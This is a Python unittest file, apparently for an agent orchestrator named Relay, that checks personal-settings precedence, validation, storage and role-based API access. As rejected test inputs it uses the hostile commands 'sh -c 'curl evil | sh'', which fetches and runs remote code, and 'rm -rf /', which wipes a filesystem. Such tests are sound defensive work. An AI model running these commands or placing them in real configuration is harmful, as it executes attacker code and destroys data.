"""Personal settings: precedence, what stays shared, clearing an override, and no-op for a fresh install.

Nothing here touches a real installation:

    RELAY_DATA_DIR is a temporary folder, set before Relay is imported.
    python -m unittest tests.test_personal_settings -v
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
TMP = tempfile.mkdtemp(prefix="relay-personal-test-")
os.environ["RELAY_DATA_DIR"] = TMP
# The test client calls the API from loopback; in the check image that is otherwise refused.
os.environ["RELAY_ALLOW_LOOPBACK_ADMIN"] = "1"
sys.path.insert(0, str(ROOT))

from orchestrator import config as C  # noqa: E402
from orchestrator import personal as P  # noqa: E402
from orchestrator.manager import Manager  # noqa: E402
from orchestrator.org import identity, rbac  # noqa: E402
from orchestrator.org import settings as OS  # noqa: E402

ORG_ONLY = {"redeploy_command": "sh -c 'curl evil | sh'", "redeploy_enabled": True, "max_parallel": 4,
            "github_issue_repo": "someone/else", "agent_env": {"claude": {"ANTHROPIC_API_KEY": "sk-test"}}}


def a_user(username: str, role: str, settings: dict | None = None) -> dict:
    """A person in the users store, with optional personal settings."""
    store = identity.raw_store()

    def fn(d):
        rows = [x for x in d.get("users") or [] if x.get("username") != username]
        rows.append({"username": username, "name": username.title(), "role": role, "role_source": "manual",
                     "groups": [], "prefs": {"settings": dict(settings or {})}})
        d["users"] = rows
    store.update(fn)
    return identity.get(username)


class ResolverTests(unittest.TestCase):
    """The one place the precedence lives: orchestrator/personal.py."""

    def setUp(self):
        self.cfg = dict(C.DEFAULTS)
        self.nobody = a_user("res-nobody", "member")
        self.picky = a_user("res-picky", "member", {"max_review_rounds": 7, "verify_mode": "off",
                                                    "roles": {"worker": {"agent": "gemini", "model": "", "effort": "", "provider": ""}}})

    def test_without_personal_settings_the_organisation_wins(self):
        self.assertEqual(P.effective(self.cfg, self.nobody), self.cfg)
        self.assertEqual(P.overrides(self.nobody), {})
        self.assertEqual(set(P.sources(self.cfg, self.nobody).values()), {"organisation"})

    def test_personal_settings_win_over_the_organisation(self):
        eff = P.effective(self.cfg, self.picky)
        self.assertEqual(eff["max_review_rounds"], 7)
        self.assertEqual(eff["verify_mode"], "off")
        # untouched keys still come from the organisation
        self.assertEqual(eff["max_turns"], self.cfg["max_turns"])
        # roles merge per role: the worker is theirs, the supervisor is the organisation's
        self.assertEqual(eff["roles"]["worker"]["agent"], "gemini")
        self.assertEqual(eff["roles"]["supervisor"]["agent"], self.cfg["roles"]["supervisor"]["agent"])
        # and resolving for one person never changes the organisation's own settings
        self.assertEqual(self.cfg["max_review_rounds"], C.DEFAULTS["max_review_rounds"])

    def test_sources_say_where_each_value_comes_from(self):
        src = P.sources(self.cfg, self.picky)
        self.assertEqual(src["max_review_rounds"], "yours")
        self.assertEqual(src["roles"], "yours")
        self.assertEqual(src["max_turns"], "organisation")

    def test_view_carries_both_values(self):
        v = P.view(self.cfg, self.picky)
        self.assertEqual(v["effective"]["verify_mode"], "off")
        self.assertEqual(v["organisation"]["verify_mode"], self.cfg["verify_mode"])
        self.assertIn("max_review_rounds", v["personal"])

    def test_only_personal_keys_can_be_stored(self):
        for k, v in ORG_ONLY.items():
            with self.assertRaises(ValueError, msg=k):
                P.clean({k: v})
        self.assertNotIn("redeploy_command", P.KEYS)
        self.assertNotIn("providers", P.KEYS)
        self.assertNotIn("agent_env", P.KEYS)

    def test_values_are_validated(self):
        with self.assertRaises(ValueError):
            P.clean({"verify_mode": "whenever"})
        with self.assertRaises(ValueError):
            P.clean({"roles": {"worker": {"agent": "nonesuch"}}})
        with self.assertRaises(ValueError):
            P.clean({"workflow_preset": "not-a-preset"})
        self.assertEqual(P.clean({"max_review_rounds": 999})["max_review_rounds"], 20)  # clamped, not stored raw
        self.assertEqual(P.clean({"max_review_rounds": None})["max_review_rounds"], None)  # None clears


class StoreTests(unittest.TestCase):
    """Overrides live in the existing user preferences record; no second store."""

    def setUp(self):
        self.u = a_user("store-person", "member")

    def test_save_and_clear_one_key(self):
        P.save("store-person", {"team_mode": "solo", "max_turns": 30})
        u = identity.get("store-person")
        self.assertEqual(u["prefs"]["settings"], {"team_mode": "solo", "max_turns": 30})
        self.assertEqual(P.effective(dict(C.DEFAULTS), u)["team_mode"], "solo")
        P.clear("store-person", ["team_mode"])
        u = identity.get("store-person")
        self.assertEqual(P.overrides(u), {"max_turns": 30})
        self.assertEqual(P.effective(dict(C.DEFAULTS), u)["team_mode"], C.DEFAULTS["team_mode"])

    def test_clearing_everything_falls_back(self):
        P.save("store-person", {"team_mode": "team", "verify_mode": "off"})
        P.clear("store-person")
        u = identity.get("store-person")
        self.assertEqual(P.overrides(u), {})
        self.assertEqual(P.effective(dict(C.DEFAULTS), u), dict(C.DEFAULTS))

    def test_preferences_cannot_smuggle_settings_in(self):
        """save_prefs is the appearance/notifications endpoint; personal settings have their own, validated one."""
        P.save("store-person", {"team_mode": "solo"})
        identity.save_prefs("store-person", {"theme": "dark", "settings": {"redeploy_command": "rm -rf /", "team_mode": "team"}})
        u = identity.get("store-person")
        self.assertEqual(u["prefs"]["theme"], "dark")
        self.assertEqual(u["prefs"]["settings"], {"team_mode": "solo"})

    def test_nothing_secret_is_a_personal_key(self):
        for k in P.KEYS:
            self.assertNotIn("key", k)
            self.assertNotIn("token", k)
            self.assertNotIn("secret", k)
            self.assertNotIn("password", k)


class WorkflowPrecedenceTests(unittest.TestCase):
    """manager.build_workflow: the task's own value, then the person's, then the organisation's."""

    def setUp(self):
        self.manager = Manager(lambda typ, payload: None)
        self.cfg = dict(C.DEFAULTS)
        self.manager._cfg = self.cfg
        self.manager._cfg_at = 10 ** 20
        self.plain = a_user("wf-plain", "member")
        self.mine = a_user("wf-mine", "member", {"max_review_rounds": 9, "team_mode": "solo",
                                                 "roles": {"supervisor": {"agent": "claude", "model": "", "effort": "", "provider": ""},
                                                           "worker": {"agent": "claude", "model": "", "effort": "", "provider": ""}}})

    def test_organisation_default_when_the_person_has_nothing(self):
        wf = self.manager.build_workflow({}, user=self.plain)
        self.assertEqual(wf["max_review_rounds"], self.cfg["max_review_rounds"])
        self.assertEqual(wf["roles"]["supervisor"]["agent"], self.cfg["roles"]["supervisor"]["agent"])
        self.assertEqual(wf["defaults_from"], {"user": "wf-plain", "personal": []})

    def test_the_persons_own_setting_beats_the_organisation(self):
        wf = self.manager.build_workflow({"workflow": {"preset": "custom"}}, user=self.mine)
        self.assertEqual(wf["max_review_rounds"], 9)
        self.assertEqual(wf["team_mode"], "solo")
        self.assertEqual(wf["roles"]["supervisor"]["agent"], "claude")
        self.assertEqual(wf["defaults_from"]["user"], "wf-mine")
        self.assertIn("max_review_rounds", wf["defaults_from"]["personal"])

    def test_the_task_beats_the_person(self):
        wf = self.manager.build_workflow({"workflow": {"preset": "custom", "max_review_rounds": 2, "team_mode": "team"}}, user=self.mine)
        self.assertEqual(wf["max_review_rounds"], 2)
        self.assertEqual(wf["team_mode"], "team")

    def test_one_persons_settings_do_not_leak_into_anothers_task(self):
        self.manager.build_workflow({"workflow": {"preset": "custom"}}, user=self.mine)
        wf = self.manager.build_workflow({}, user=self.plain)
        self.assertEqual(wf["max_review_rounds"], self.cfg["max_review_rounds"])
        self.assertEqual(wf["team_mode"], self.cfg["team_mode"])

    def test_no_user_at_all_is_todays_behaviour(self):
        """An automation with nobody behind it (GitHub intake, the queue) uses the organisation's."""
        wf = self.manager.build_workflow({})
        self.assertEqual(wf["max_review_rounds"], self.cfg["max_review_rounds"])
        self.assertEqual(wf["defaults_from"], {"user": "", "personal": []})

    def test_a_request_body_cannot_name_the_person(self):
        """Identity comes from the trusted header, never from what was posted."""
        wf = self.manager.build_workflow({"_user": self.mine, "user": "wf-mine", "username": "wf-mine"})
        self.assertEqual(wf["max_review_rounds"], self.cfg["max_review_rounds"])
        self.assertEqual(wf["defaults_from"]["user"], "")


class UnchangedInstallationTests(unittest.TestCase):
    """An installation where nobody has personal settings behaves exactly as before."""

    def test_defaults_are_empty(self):
        self.assertEqual(identity.DEFAULT_PREFS["settings"], {})
        u = a_user("fresh-person", "owner")
        self.assertEqual(P.overrides(u), {})

    def test_a_user_record_from_before_this_feature_still_works(self):
        store = identity.raw_store()
        store.update(lambda d: d.__setitem__("users", [x for x in d.get("users") or [] if x.get("username") != "legacy-person"]
                                             + [{"username": "legacy-person", "role": "member", "prefs": {"theme": "dark"}}]))
        u = identity.get("legacy-person")
        self.assertEqual(u["prefs"]["settings"], {})
        cfg = dict(C.DEFAULTS)
        self.assertEqual(P.effective(cfg, u), cfg)

    def test_build_workflow_is_unchanged_apart_from_the_record_of_its_defaults(self):
        m = Manager(lambda typ, payload: None)
        m._cfg, m._cfg_at = dict(C.DEFAULTS), 10 ** 20
        wf = m.build_workflow({})
        wf.pop("defaults_from")
        m2 = Manager(lambda typ, payload: None)
        m2._cfg, m2._cfg_at = dict(C.DEFAULTS), 10 ** 20
        expected = m2.build_workflow({}, user=a_user("nothing-set", "member"))
        expected.pop("defaults_from")
        self.assertEqual(wf, expected)


class ApiTests(unittest.TestCase):
    """Roles through the HTTP API, with identity coming from the forward-auth header."""

    @classmethod
    def setUpClass(cls):
        import web_app
        cls.web_app = web_app
        cls.client = web_app.app.test_client()
        OS.save({"auth": {"header_auth": True, "auto_provision": False, "first_user_owner": False}})

    @classmethod
    def tearDownClass(cls):
        OS.save({"auth": {"header_auth": False, "auto_provision": True, "first_user_owner": True}})

    def setUp(self):
        a_user("api-viewer", "viewer")
        a_user("api-member", "member")
        a_user("api-admin", "admin")

    def as_(self, username, method, path, **kw):
        return getattr(self.client, method)(path, headers={"X-Authentik-Username": username}, **kw)

    def test_a_viewer_or_member_cannot_change_organisation_settings(self):
        for who in ("api-viewer", "api-member"):
            r = self.as_(who, "post", "/api/settings", json={"redeploy_command": "sh -c 'curl evil | sh'"})
            self.assertEqual(r.status_code, 403, f"{who}: {r.get_data(as_text=True)}")
            self.assertIn("admin", r.get_json()["error"])
        self.assertEqual(C.load()["redeploy_command"], "")
        # the rule is in the matrix, not only in the page
        self.assertEqual(rbac.rule_for("POST", "/api/settings")[0], "admin")

    def test_a_member_cannot_reach_a_shared_setting_through_the_personal_endpoint(self):
        for k, v in ORG_ONLY.items():
            r = self.as_("api-member", "patch", "/api/org/me/settings", json={k: v})
            self.assertEqual(r.status_code, 400, f"{k}: {r.get_data(as_text=True)}")
            self.assertIn("organisation setting", r.get_json()["error"])
        cfg = C.load()
        self.assertEqual(cfg["redeploy_command"], "")
        self.assertEqual(cfg["max_parallel"], C.DEFAULTS["max_parallel"])
        self.assertEqual(P.overrides(identity.get("api-member")), {})

    def test_a_member_can_set_and_clear_their_own_defaults(self):
        r = self.as_("api-member", "patch", "/api/org/me/settings", json={"team_mode": "solo", "max_review_rounds": 5})
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        d = r.get_json()
        self.assertEqual(d["settings"]["sources"]["team_mode"], "yours")
        self.assertEqual(d["settings"]["effective"]["team_mode"], "solo")
        self.assertEqual(d["settings"]["organisation"]["team_mode"], C.load()["team_mode"])
        self.assertEqual(d["config"]["team_mode"], "solo")  # the browser is handed resolved values
        # everybody else still gets the organisation default
        other = self.as_("api-viewer", "get", "/api/org/me/settings").get_json()
        self.assertEqual(other["settings"]["effective"]["team_mode"], C.load()["team_mode"])
        self.assertEqual(other["settings"]["sources"]["team_mode"], "organisation")
        # clearing one key falls back, the other stays
        r = self.as_("api-member", "delete", "/api/org/me/settings?key=team_mode")
        self.assertEqual(r.status_code, 200)
        d = r.get_json()
        self.assertEqual(d["settings"]["sources"]["team_mode"], "organisation")
        self.assertEqual(d["settings"]["effective"]["team_mode"], C.load()["team_mode"])
        self.assertEqual(d["settings"]["effective"]["max_review_rounds"], 5)
        # and clearing everything falls back completely
        d = self.as_("api-member", "delete", "/api/org/me/settings").get_json()
        self.assertEqual(d["settings"]["personal"], {})
        self.assertEqual(d["settings"]["effective"]["max_review_rounds"], C.load()["max_review_rounds"])

    def test_a_viewer_may_change_their_own_settings(self):
        r = self.as_("api-viewer", "patch", "/api/org/me/settings", json={"settings": {"verify_mode": "off"}})
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        self.assertEqual(r.get_json()["settings"]["effective"]["verify_mode"], "off")
        self.as_("api-viewer", "delete", "/api/org/me/settings")

    def test_state_is_resolved_per_person(self):
        self.as_("api-member", "patch", "/api/org/me/settings", json={"max_turns": 33})
        mine = self.as_("api-member", "get", "/api/state").get_json()["config"]
        theirs = self.as_("api-admin", "get", "/api/state").get_json()["config"]
        self.assertEqual(mine["max_turns"], 33)
        self.assertEqual(theirs["max_turns"], C.load()["max_turns"])
        self.as_("api-member", "delete", "/api/org/me/settings")

    def test_an_admin_still_edits_the_organisation_default(self):
        r = self.as_("api-admin", "post", "/api/settings", json={"max_review_rounds": 4})
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        self.assertEqual(C.load()["max_review_rounds"], 4)
        # and that default reaches somebody with no personal setting
        d = self.as_("api-viewer", "get", "/api/org/me/settings").get_json()
        self.assertEqual(d["settings"]["effective"]["max_review_rounds"], 4)
        self.as_("api-admin", "post", "/api/settings", json={"max_review_rounds": C.DEFAULTS["max_review_rounds"]})


if __name__ == "__main__":
    unittest.main()
